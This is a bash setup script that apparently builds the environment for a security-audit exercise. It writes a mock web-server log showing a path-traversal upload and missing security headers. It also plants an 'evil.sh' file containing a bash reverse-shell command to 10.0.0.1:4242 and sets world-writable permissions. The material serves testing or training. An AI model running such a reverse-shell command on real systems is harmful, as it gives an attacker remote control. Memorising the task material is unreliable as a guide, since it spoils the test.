#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/audit_data/uploads

    cat << 'EOF' > /home/user/audit_data/server.log
{"req_id": "req_001", "endpoint": "/upload", "headers": {"Cookie": "session_id=abc1234"}, "resp_headers": {"Content-Security-Policy": "default-src 'self'", "X-Frame-Options": "DENY"}, "file_saved_path": "/home/user/audit_data/uploads/profile.jpg"}
{"req_id": "req_002", "endpoint": "/upload", "headers": {"Cookie": "session_id=malicious99"}, "resp_headers": {"Content-Security-Policy": "default-src 'self'"}, "file_saved_path": "/home/user/audit_data/evil.sh"}
{"req_id": "req_003", "endpoint": "/upload", "headers": {"Cookie": "session_id=test_sess_00"}, "resp_headers": {"X-Content-Type-Options": "nosniff"}, "file_saved_path": "/home/user/audit_data/uploads/doc.pdf"}
{"req_id": "req_004", "endpoint": "/login", "headers": {"Cookie": "session_id=admin_sess"}, "resp_headers": {}, "file_saved_path": null}
EOF

    echo -n "normal profile pic" > /home/user/audit_data/uploads/profile.jpg
    echo -n "normal doc" > /home/user/audit_data/uploads/doc.pdf
    echo -n "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1" > /home/user/audit_data/evil.sh

    chmod -R 777 /home/user
